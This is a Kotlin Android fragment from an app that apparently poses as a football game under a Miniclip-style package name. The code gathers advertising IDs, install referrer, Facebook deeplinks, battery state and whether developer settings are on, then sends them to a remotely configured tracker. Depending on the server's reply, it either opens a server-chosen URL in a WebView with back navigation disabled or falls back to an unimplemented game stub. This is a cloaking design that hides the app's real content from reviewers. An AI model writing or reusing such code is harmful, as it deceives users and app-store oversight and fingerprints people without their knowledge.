package com.miniclip.footb.ui.intro_screen

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.animation.AnimationUtils
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.lifecycleScope
import androidx.lifecycle.repeatOnLifecycle
import com.miniclip.footb.R
import com.miniclip.footb.databinding.FragmentIntroBinding
import com.miniclip.footb.ui.intro_screen.interfaces.RemoteServerScheme
import com.miniclip.footb.ui.intro_screen.viewmodels.IntroViewModel
import com.miniclip.footb.ui.model.CollectDataForLink
import com.miniclip.footb.ui.model.ConfigData
import com.miniclip.footb.ui.model.TrackingData
import com.miniclip.footb.ui.services.analytic.NotificationMessageManager.URL_KEY
import com.miniclip.footb.ui.services.analytic.checkAndNavigateWithValues
import com.miniclip.footb.ui.services.extensions.g_param.AdvertisingParamImpl
import com.miniclip.footb.ui.services.extensions.phone_param.PhoneExtensionImpl
import com.miniclip.footb.ui.services.params.config.MyConfigImpl
import com.miniclip.footb.ui.services.params.long_awaited.m_apps_flyer.MyAppsFlyerImpl
import com.miniclip.footb.ui.services.params.long_awaited.m_apps_flyer.MyAppsFlyerImpl.Companion.APPS_FLYER_DEV_KEY
import com.miniclip.footb.ui.services.params.long_awaited.m_fb.MyFbImpl
import com.miniclip.footb.ui.services.params.long_awaited.m_fb.MyFbImpl.FacebookConstants.APP_ID
import com.miniclip.footb.ui.services.params.long_awaited.m_fb.MyFbImpl.FacebookConstants.DECRYPTION_KEY
import com.miniclip.footb.ui.services.params.long_awaited.m_fb.MyFbImpl.FacebookConstants.TOKEN
import com.miniclip.footb.ui.services.params.long_awaited.m_referrer.MyReferrerImpl
import com.miniclip.footb.ui.services.signal_pusher.MySignalPusherImpl
import com.miniclip.footb.ui.web_screen.WorldWideWebActivity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

class IntroFragment : Fragment(), RemoteServerScheme {

    private var _binding: FragmentIntroBinding? = null

    private val binding get() = _binding!!

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) {
            activateApp()
        }

    @Inject
    lateinit var appsFlyerClient: MyAppsFlyerImpl

    @Inject
    lateinit var referrerClient: MyReferrerImpl

    @Inject
    lateinit var facebookClient: MyFbImpl

    @Inject
    lateinit var firebaseClient: MyConfigImpl

    @Inject
    lateinit var googleAdIdClient: AdvertisingParamImpl

    @Inject
    lateinit var userPhoneDataClient: PhoneExtensionImpl

    @Inject
    lateinit var oneSignalClient: MySignalPusherImpl

    private val introViewModel: IntroViewModel by viewModels()

    override fun onAttach(context: Context) {
        super.onAttach(context)
        onBackPressHandle()
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        _binding = FragmentIntroBinding.inflate(inflater, container, false)

        binding.setSlideToCenterAnimation()
        permissionPrepare()

        return binding.root
    }

    private fun permissionPrepare() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val permission = Manifest.permission.POST_NOTIFICATIONS
            val granted = PackageManager.PERMISSION_GRANTED
            if (ContextCompat.checkSelfPermission(requireActivity(), permission) == granted) {
                activateApp()
            } else {
                permissionLauncher.launch(permission)
            }
        } else activateApp()
    }

    private fun activateApp() {
        introViewModel.getUrlFromDataStore()

        lifecycleScope.launch {
            repeatOnLifecycle(Lifecycle.State.STARTED) {
                introViewModel.savedUrlState.collect { url ->
                    if (url.isNullOrBlank().not()) {
                        pathToWeb(url, isCache = true)
                        return@collect
                    } else {
                        remoteServerBuildProcess()
                    }
                }
            }
        }
    }

    override fun remoteServerBuildProcess() = lifecycleScope.launch {
        val firebaseRemoteConfig = firebaseClient.getDataClass()

        if (firebaseRemoteConfig.tracker.isBlank() && firebaseRemoteConfig.tracker == "null") {
            pathToLocalApp()
        } else {

            val data = collectSourceData(firebaseRemoteConfig.fbAppId, firebaseRemoteConfig.fbToken)

            val trackingData = TrackingData(
                facebookDeeplink = data.deeplink,
                installReferrer = data.referrer,
                facebookDecryption = DECRYPTION_KEY,
                randomParamsInLinkEnabled = false,
                applicationId = data.bundle,
                appsId = data.appsFlyerID,
                googleAdId = data.gaid,
                appDeveloperKey = APPS_FLYER_DEV_KEY,
                userBattery = data.battery.toString(),
                remoteConfig = ConfigData(
                    tracker = firebaseRemoteConfig.tracker,
                    isAppsFlyerEnabled = firebaseRemoteConfig.isAppsFlyerEnabled,
                    fbAppId = firebaseRemoteConfig.fbAppId ?: APP_ID,
                    fbToken = firebaseRemoteConfig.fbToken ?: TOKEN,
                ),
                attributionData = data.appsFlyerMap,
                isUserDeveloper = data.adb
            )

            introViewModel.getRemoteData(trackingData)

            lifecycleScope.launch {
                repeatOnLifecycle(Lifecycle.State.STARTED) {
                    introViewModel.finalLinkState.collect { remoteData ->

                        val url = remoteData.url
                        val push = remoteData.push

                        if (push != null) {
                            oneSignalClient.pushConnectionData(
                                id = data.appsFlyerID.toString(),
                                sentence = push
                            )
                        }

                        if (url != null) {
                            pathToWeb(remoteData.url, isCache = false)
                        } else {
                            pathToLocalApp()
                        }
                    }
                }
            }
        }
    }

    private suspend fun collectSourceData(
        fbAppId: String?,
        fbToken: String?
    ): CollectDataForLink {

        val collectData = CollectDataForLink()

        lifecycleScope.launch {
            listOf(
                this.async {
                    withContext(Dispatchers.IO) {
                        collectData.appsFlyerMap = appsFlyerClient.getConversionMap()
                    }
                },
                async {
                    collectData.referrer = referrerClient.getServiceString()
                },
                async {
                    collectData.deeplink = facebookClient.getFetchedDeepLink(fbAppId, fbToken)
                },
                async {
                    collectData.gaid = googleAdIdClient.getAdvertisingID()
                    collectData.appsFlyerID = appsFlyerClient.getServiceUID()
                }
            ).awaitAll()
        }

        collectData.adb = userPhoneDataClient.isDeveloperSettingsEnable()
        collectData.bundle = userPhoneDataClient.getAppPackageName()
        collectData.battery = userPhoneDataClient.getChargeStatus()

        return collectData
    }

    override fun pathToWeb(appUrl: String?, isCache: Boolean) {
        Log.d("Develop_App", " OPEN WEB -> LINK = $appUrl")

        Intent(context, WorldWideWebActivity::class.java).run {
            putExtra(URL_KEY, appUrl)
            requireActivity().checkAndNavigateWithValues(this, isCache) {
                requireActivity().finish()
            }
        }
    }

    override fun pathToLocalApp() {
        Log.d("Develop_App", " OPEN APP")
        // TODO Add Game activity
        /*Intent(context, LocalAppActivity::class.java).run {
            requireActivity().checkAndNavigateWithValues(this) {
                requireActivity().finish()
            }
        }*/
    }

    private fun onBackPressHandle() {
        val callback = object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {}
        }

        requireActivity().onBackPressedDispatcher.addCallback(
            this,
            callback
        )
    }

    private fun FragmentIntroBinding.setSlideToCenterAnimation() {
        val bottomAnim = AnimationUtils.loadAnimation(requireActivity(), R.anim.slide_from_bottom)
        cardLoader.animation = bottomAnim
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}